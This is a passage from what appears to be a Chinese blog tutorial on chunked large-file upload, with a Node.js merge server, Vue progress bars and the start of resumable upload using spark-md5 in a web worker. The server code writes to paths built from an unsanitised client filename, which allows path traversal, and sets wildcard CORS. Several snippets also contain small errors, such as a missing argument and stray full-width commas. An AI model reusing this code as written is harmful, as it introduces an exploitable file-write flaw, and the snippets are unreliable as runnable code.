<code>multiparty</code> 包处理前端传来的 FormData</p><p>在 multiparty.parse 的回调中，files 参数保存了 FormData 中文件，fields 参数保存了 FormData 中非文件的字段</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fse = <span class="built_in">require</span>(<span class="string">&quot;fs-extra&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> multiparty = <span class="built_in">require</span>(<span class="string">&quot;multiparty&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>();</span><br><span class="line">+ <span class="keyword">const</span> <span class="variable constant_">UPLOAD_DIR</span> = path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;target&quot;</span>); <span class="comment">// 大文件存储目录</span></span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&quot;request&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;OPTIONS&quot;</span>) &#123;</span><br><span class="line">    res.<span class="property">status</span> = <span class="number">200</span>;</span><br><span class="line">    res.<span class="title function_">end</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">+  <span class="keyword">const</span> multipart = <span class="keyword">new</span> multiparty.<span class="title class_">Form</span>();</span><br><span class="line"></span><br><span class="line">+  multipart.<span class="title function_">parse</span>(req, <span class="keyword">async</span> (err, fields, files) =&gt; &#123;</span><br><span class="line">+    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">+      <span class="keyword">return</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+    <span class="keyword">const</span> [chunk] = files.<span class="property">chunk</span>;</span><br><span class="line">+    <span class="keyword">const</span> [hash] = fields.<span class="property">hash</span>;</span><br><span class="line">+    <span class="keyword">const</span> [filename] = fields.<span class="property">filename</span>;</span><br><span class="line">+    <span class="keyword">const</span> chunkDir = path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, filename);</span><br><span class="line"></span><br><span class="line">+   <span class="comment">// 切片目录不存在，创建切片目录</span></span><br><span class="line">+    <span class="keyword">if</span> (!fse.<span class="title function_">existsSync</span>(chunkDir)) &#123;</span><br><span class="line">+      <span class="keyword">await</span> fse.<span class="title function_">mkdirs</span>(chunkDir);</span><br><span class="line">+    &#125;</span><br><span class="line"></span><br><span class="line">+      <span class="comment">// fs-extra 专用方法，类似 fs.rename 并且跨平台</span></span><br><span class="line">+      <span class="comment">// fs-extra 的 rename 方法 windows 平台会有权限问题</span></span><br><span class="line">+      <span class="comment">// https://github.com/meteor/meteor/issues/7852#issuecomment-255767835</span></span><br><span class="line">+      <span class="keyword">await</span> fse.<span class="title function_">move</span>(chunk.<span class="property">path</span>, <span class="string">`<span class="subst">$&#123;chunkDir&#125;</span>/<span class="subst">$&#123;hash&#125;</span>`</span>);</span><br><span class="line">+    res.<span class="title function_">end</span>(<span class="string">&quot;received file chunk&quot;</span>);</span><br><span class="line">+  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;正在监听 3000 端口&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://user-gold-cdn.xitu.io/2020/1/11/16f905fb6a626f47?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20200110215559194"></p><p>查看 multiparty 处理后的 chunk 对象，path 是存储临时文件的路径，size 是临时文件大小，在 multiparty 文档中提到可以使用 fs.rename(由于我用的是 fs-extra，它的 rename 方法 windows 平台权限问题，所以换成了 fse.move) 移动临时文件，即移动文件切片</p><p>在接受文件切片时，需要先创建存储切片的文件夹，由于前端在发送每个切片时额外携带了唯一值 hash，所以以 hash 作为文件名，将切片从临时路径移动切片文件夹中，最后的结果如下</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/8/16f83c3caac8eb65?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="合并切片"><a href="#合并切片" class="headerlink" title="合并切片"></a>合并切片</h3><p>在接收到前端发送的合并请求后，服务端将文件夹下的所有切片进行合并</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fse = <span class="built_in">require</span>(<span class="string">&quot;fs-extra&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">UPLOAD_DIR</span> = path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;..&quot;</span>, <span class="string">&quot;target&quot;</span>); <span class="comment">// 大文件存储目录</span></span><br><span class="line"></span><br><span class="line">+ <span class="keyword">const</span> <span class="title function_">resolvePost</span> = req =&gt;</span><br><span class="line">+   <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">+     <span class="keyword">let</span> chunk = <span class="string">&quot;&quot;</span>;</span><br><span class="line">+     req.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">+       chunk += data;</span><br><span class="line">+     &#125;);</span><br><span class="line">+     req.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">+       <span class="title function_">resolve</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(chunk));</span><br><span class="line">+     &#125;);</span><br><span class="line">+   &#125;);</span><br><span class="line"></span><br><span class="line">+ <span class="keyword">const</span> <span class="title function_">pipeStream</span> = (<span class="params">path, writeStream</span>) =&gt;</span><br><span class="line">+  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">+    <span class="keyword">const</span> readStream = fse.<span class="title function_">createReadStream</span>(path);</span><br><span class="line">+    readStream.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">+      fse.<span class="title function_">unlinkSync</span>(path);</span><br><span class="line">+      <span class="title function_">resolve</span>();</span><br><span class="line">+    &#125;);</span><br><span class="line">+    readStream.<span class="title function_">pipe</span>(writeStream);</span><br><span class="line">+  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并切片</span></span><br><span class="line">+ <span class="keyword">const</span> <span class="title function_">mergeFileChunk</span> = <span class="keyword">async</span> (<span class="params">filePath, filename, size</span>) =&gt; &#123;</span><br><span class="line">+  <span class="keyword">const</span> chunkDir = path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, filename);</span><br><span class="line">+  <span class="keyword">const</span> chunkPaths = <span class="keyword">await</span> fse.<span class="title function_">readdir</span>(chunkDir);</span><br><span class="line">+  <span class="comment">// 根据切片下标进行排序</span></span><br><span class="line">+  <span class="comment">// 否则直接读取目录的获得的顺序可能会错乱</span></span><br><span class="line">+  chunkPaths.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.<span class="title function_">split</span>(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>] - b.<span class="title function_">split</span>(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">+  <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(</span><br><span class="line">+    chunkPaths.<span class="title function_">map</span>(<span class="function">(<span class="params">chunkPath, index</span>) =&gt;</span></span><br><span class="line">+      <span class="title function_">pipeStream</span>(</span><br><span class="line">+        path.<span class="title function_">resolve</span>(chunkDir, chunkPath),</span><br><span class="line">+        <span class="comment">// 指定位置创建可写流</span></span><br><span class="line">+        fse.<span class="title function_">createWriteStream</span>(filePath, &#123;</span><br><span class="line">+          <span class="attr">start</span>: index * size,</span><br><span class="line">+          <span class="attr">end</span>: (index + <span class="number">1</span>) * size</span><br><span class="line">+        &#125;)</span><br><span class="line">+      )</span><br><span class="line">+    )</span><br><span class="line">+  );</span><br><span class="line">+  fse.<span class="title function_">rmdirSync</span>(chunkDir); <span class="comment">// 合并后删除保存切片的目录</span></span><br><span class="line">+&#125;;</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&quot;request&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;OPTIONS&quot;</span>) &#123;</span><br><span class="line">    res.<span class="property">status</span> = <span class="number">200</span>;</span><br><span class="line">    res.<span class="title function_">end</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">+   <span class="keyword">if</span> (req.<span class="property">url</span> === <span class="string">&quot;/merge&quot;</span>) &#123;</span><br><span class="line">+     <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">resolvePost</span>(req);</span><br><span class="line">+     <span class="keyword">const</span> &#123; filename,size &#125; = data;</span><br><span class="line">+     <span class="keyword">const</span> filePath = path.<span class="title function_">resolve</span>(<span class="variable constant_">UPLOAD_DIR</span>, <span class="string">`<span class="subst">$&#123;filename&#125;</span>`</span>);</span><br><span class="line">+     <span class="keyword">await</span> <span class="title function_">mergeFileChunk</span>(filePath, filename);</span><br><span class="line">+     res.<span class="title function_">end</span>(</span><br><span class="line">+       <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">+         <span class="attr">code</span>: <span class="number">0</span>,</span><br><span class="line">+         <span class="attr">message</span>: <span class="string">&quot;file merged success&quot;</span></span><br><span class="line">+       &#125;)</span><br><span class="line">+     );</span><br><span class="line">+   &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;正在监听 3000 端口&quot;</span>));</span><br></pre></td></tr></table></figure><p>由于前端在发送合并请求时会携带文件名，服务端根据文件名可以找到上一步创建的切片文件夹</p><p>接着使用 fs.createWriteStream 创建一个可写流，可写流文件名就是<strong>切片文件夹名 + 后缀名</strong>组合而成</p><p>随后遍历整个切片文件夹，将切片通过 fs.createReadStream 创建可读流，传输合并到目标文件中</p><p>值得注意的是每次可读流都会传输到可写流的指定位置，这是通过 createWriteStream 的第二个参数 start&#x2F;end 控制的，目的是能够并发合并多个可读流到可写流中，这样即使流的顺序不同也能传输到正确的位置，所以这里还需要让前端在请求的时候多提供一个 size 参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">async</span> <span class="title function_">mergeRequest</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000/merge&quot;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">+         <span class="attr">size</span>: <span class="variable constant_">SIZE</span>,</span><br><span class="line">          <span class="attr">filename</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p><img src="https://user-gold-cdn.xitu.io/2020/1/22/16fccc5d950c2275?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>其实也可以等上一个切片合并完后再合并下个切片，这样就不需要指定位置，但传输速度会降低，所以使用了并发合并的手段，接着只要保证每次合并完成后删除这个切片，等所有切片都合并完毕后最后删除切片文件夹即可</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/8/16f8414c7fae1c1f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>至此一个简单的大文件上传就完成了，接下来我们再此基础上扩展一些额外的功能</p><h2 id="显示上传进度条"><a href="#显示上传进度条" class="headerlink" title="显示上传进度条"></a>显示上传进度条</h2><p>上传进度分两种，一个是每个切片的上传进度，另一个是整个文件的上传进度，而整个文件的上传进度是基于每个切片上传进度计算而来，所以我们先实现切片的上传进度</p><h3 id="切片进度条"><a href="#切片进度条" class="headerlink" title="切片进度条"></a>切片进度条</h3><p>XMLHttpRequest 原生支持上传进度的监听，只需要监听 upload.onprogress 即可，我们在原来的 request 基础上传入 onProgress 参数，给 XMLHttpRequest 注册监听事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// xhr</span></span><br><span class="line">    <span class="title function_">request</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">      url,</span></span><br><span class="line"><span class="params">      method = <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="params">      data,</span></span><br><span class="line"><span class="params">      headers = &#123;&#125;,</span></span><br><span class="line"><span class="params">+      onProgress = e =&gt; e,</span></span><br><span class="line"><span class="params">      requestList</span></span><br><span class="line"><span class="params">    &#125;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">+       xhr.<span class="property">upload</span>.<span class="property">onprogress</span> = onProgress;</span><br><span class="line">        xhr.<span class="title function_">open</span>(method, url);</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">keys</span>(headers).<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span></span><br><span class="line">          xhr.<span class="title function_">setRequestHeader</span>(key, headers[key])</span><br><span class="line">        );</span><br><span class="line">        xhr.<span class="title function_">send</span>(data);</span><br><span class="line">        xhr.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(&#123;</span><br><span class="line">            <span class="attr">data</span>: e.<span class="property">target</span>.<span class="property">response</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于每个切片都需要触发独立的监听事件，所以还需要一个工厂函数，根据传入的切片返回不同的监听函数</p><p>在原先的前端上传逻辑中新增监听函数部分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 上传切片，同时过滤已上传的切片</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">uploadChunks</span>(<span class="params">uploadedList = []</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> requestList = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">+       .<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; chunk,hash,index &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">          formData.<span class="title function_">append</span>(<span class="string">&quot;chunk&quot;</span>, chunk);</span><br><span class="line">          formData.<span class="title function_">append</span>(<span class="string">&quot;hash&quot;</span>, hash);</span><br><span class="line">          formData.<span class="title function_">append</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>);</span><br><span class="line">+         <span class="keyword">return</span> &#123; formData,index &#125;;</span><br><span class="line">        &#125;)</span><br><span class="line">+       .<span class="title function_">map</span>(<span class="keyword">async</span> (&#123; formData,index &#125;) =&gt;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: formData，</span><br><span class="line">+           <span class="attr">onProgress</span>: <span class="variable language_">this</span>.<span class="title function_">createProgressHandler</span>(<span class="variable language_">this</span>.<span class="property">data</span>[index]),</span><br><span class="line">          &#125;)</span><br><span class="line">        );</span><br><span class="line">      <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(requestList);</span><br><span class="line">       <span class="comment">// 合并切片</span></span><br><span class="line">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">mergeRequest</span>();</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;，index</span>) =&gt;</span> (&#123;</span><br><span class="line">        <span class="attr">chunk</span>: file,</span><br><span class="line">+       index,</span><br><span class="line">        <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span> + <span class="string">&quot;-&quot;</span> + index</span><br><span class="line">+       <span class="attr">percentage</span>:<span class="number">0</span></span><br><span class="line">      &#125;));</span><br><span class="line">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span><br><span class="line">    &#125;    </span><br><span class="line">+   <span class="title function_">createProgressHandler</span>(<span class="params">item</span>) &#123;</span><br><span class="line">+      <span class="keyword">return</span> <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">+        item.<span class="property">percentage</span> = <span class="built_in">parseInt</span>(<span class="title class_">String</span>((e.<span class="property">loaded</span> / e.<span class="property">total</span>) * <span class="number">100</span>));</span><br><span class="line">+      &#125;;</span><br><span class="line">+    &#125;</span><br></pre></td></tr></table></figure><p>每个切片在上传时都会通过监听函数更新 data 数组对应元素的 percentage 属性，之后把将 data 数组放到视图中展示即可</p><h3 id="文件进度条"><a href="#文件进度条" class="headerlink" title="文件进度条"></a>文件进度条</h3><p>将每个切片已上传的部分累加，除以整个文件的大小，就能得出当前文件的上传进度，所以这里使用 Vue 计算属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="attr">computed</span>: &#123;</span><br><span class="line">      <span class="title function_">uploadPercentage</span>(<span class="params"></span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span> || !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">length</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">const</span> loaded = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">           .<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">size</span> * item.<span class="property">percentage</span>)</span><br><span class="line">           .<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + cur);</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">parseInt</span>((loaded / <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">size</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>));</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终视图如下</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/8/16f84ad6b4848423?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h1 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h1><p>断点续传的原理在于前端&#x2F;服务端需要<code>记住</code>已上传的切片，这样下次上传就可以跳过之前已上传的部分，有两种方案实现记忆的功能</p><ul><li>前端使用 localStorage 记录已上传的切片 hash</li><li>服务端保存已上传的切片 hash，前端每次上传前向服务端获取已上传的切片</li></ul><p>第一种是前端的解决方案，第二种是服务端，而前端方案有一个缺陷，如果换了个浏览器就失去了记忆的效果，所以这里选取后者</p><h2 id="生成-hash"><a href="#生成-hash" class="headerlink" title="生成 hash"></a>生成 hash</h2><p>无论是前端还是服务端，都必须要生成文件和切片的 hash，<code>之前我们使用文件名 + 切片下标作为切片 hash</code>，这样做文件名一旦修改就失去了效果，而事实上只要文件内容不变，hash 就不应该变化，所以正确的做法是<code>根据文件内容生成 hash</code>，所以我们修改一下 hash 的生成规则</p><p>这里用到另一个库 <code>spark-md5</code>，它可以根据文件内容计算出文件的 hash 值，另外考虑到如果上传一个超大文件，读取文件内容计算 hash 是非常耗费时间的，并且会<code>引起 UI 的阻塞</code>，导致页面假死状态，所以我们使用 web-worker 在 worker 线程计算 hash，这样用户仍可以在主界面正常的交互</p><p>由于实例化 web-worker 时，参数是一个 js 文件路径且不能跨域，所以我们单独创建一个 hash.js 文件放在 public 目录下，另外在 worker 中也是不允许访问 dom 的，但它提供了<code>importScripts</code> 函数用于导入外部脚本，通过它导入 spark-md5</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /public/hash.js</span></span><br><span class="line">self.<span class="title function_">importScripts</span>(<span class="string">&quot;/spark-md5.min.js&quot;</span>); <span class="comment">// 导入脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成文件 hash</span></span><br><span class="line">self.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; fileChunkList &#125; = e.<span class="property">data</span>;</span><br><span class="line">  <span class="keyword">const</span> spark = <span class="keyword">new</span> self.<span class="property">SparkMD5</span>.<span class="title class_">ArrayBuffer</span>();</span><br><span class="line">  <span class="keyword">let</span> percentage = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">loadNext</span> = index =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">    reader.<span class="title function_">readAsArrayBuffer</span>(fileChunkList[index].<span class="property">file</span>);</span><br><span class="line">    reader.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      count++;</span><br><span class="line">      spark.<span class="title function_">append</span>(e.<span class="property">target</span>.<span class="property">result</span>);</span><br><span class="line">      <span class="keyword">if</span> (count === fileChunkList.<span class="property">length</span>) &#123;</span><br><span class="line">        self.<span class="title function_">postMessage</span>(&#123;</span><br><span class="line">          <span class="attr">percentage</span>: <span class="number">100</span>,</span><br><span class="line">          <span class="attr">hash</span>: spark.<span class="title function_">end</span>()</span><br><span class="line">        &#125;);</span><br><span class="line">        self.<span class="title function_">close</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        percentage += <span class="number">100</span> / fileChunkList.<span 